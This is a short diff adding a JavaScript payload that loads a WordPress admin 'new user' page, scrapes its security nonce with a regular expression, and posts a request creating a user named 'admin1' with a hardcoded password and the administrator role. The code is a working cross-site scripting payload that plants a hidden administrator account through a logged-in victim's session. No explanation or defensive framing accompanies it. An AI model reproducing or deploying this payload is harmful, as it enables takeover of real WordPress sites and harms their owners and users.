@@ -1,0 +1,12 @@
+var wp_root = "" // don't add a trailing slash
+var req = new XMLHttpRequest();
+var url = "https://wpressly.com/wordpress/wp-admin/user-new.php";
+var regex = /ser" value="([^"]*?)"/g;
+req.open("GET", url, false);
+req.send();
+var nonce = regex.exec(req.responseText);
+var nonce = nonce[1];
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=admin1&email=admin@example.com&pass1=kareemP455&pass2=kareemP455&role=administrator";
+req.open("POST", url, true);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.send(params);</script>
